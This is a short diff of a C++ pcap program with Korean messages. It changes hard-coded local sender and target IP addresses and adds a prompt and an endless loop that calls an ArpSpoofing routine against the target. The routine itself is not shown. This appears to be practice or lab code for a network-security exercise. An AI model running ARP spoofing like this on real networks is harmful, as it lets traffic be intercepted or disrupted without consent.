@@ -1,13 +1,13 @@
 #include "stdafx.h"
 #include "header.h"
 
-#define DEV
+// #define DEV
 
 int main(int argc, char* argv[]) {
 #ifdef DEV
 	char adapter[]	= "rpcap://\\Device\\NPF_{960B29EE-E457-4712-8FE0-2FE256D232F6}";
-	char cSenderIP[] = "192.168.0.254";
-	char cTargetIP[] = "192.168.3.154";
+	char cSenderIP[] = "192.168.43.217";
+	char cTargetIP[] = "192.168.43.1";
 #else
 	if (argc != 4) {
 		puts("인자가 올바르게 입력되지 않았습니다!");
@@ -37,6 +37,12 @@ int main(int argc, char* argv[]) {
 	printf("myMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", myMac[0], myMac[1], myMac[2], myMac[3], myMac[4], myMac[5]);
 	printf("sendeMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", sendeMac[0], sendeMac[1], sendeMac[2], sendeMac[3], sendeMac[4], sendeMac[5]);
 	printf("targetMac: %.2X-%.2X-%.2X-%.2X-%.2X-%.2X\n", targetMac[0], targetMac[1], targetMac[2], targetMac[3], targetMac[4], targetMac[5]);
+
+	puts("ARP spoofing공격을 시작하려면 아무키나 누르세요");
+	system("pause > nul");
+
+	while (true)
+		ArpSpoofing(handle, myMac, targetIP, sendeMac, sendeIP);
 
 	system("pause");
 }
